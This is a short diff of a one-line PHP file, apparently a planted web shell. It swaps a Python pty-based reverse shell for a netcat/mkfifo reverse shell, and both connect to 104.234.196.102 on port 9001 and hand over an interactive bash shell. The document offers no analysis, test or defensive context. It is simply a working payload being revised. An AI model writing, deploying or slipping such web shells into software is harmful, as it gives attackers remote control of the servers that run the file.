@@ -1,1 +1,1 @@
-<?php system("export RHOST="104.234.196.102";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'"); ?>
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 104.234.196.102 9001 >/tmp/f"); ?>
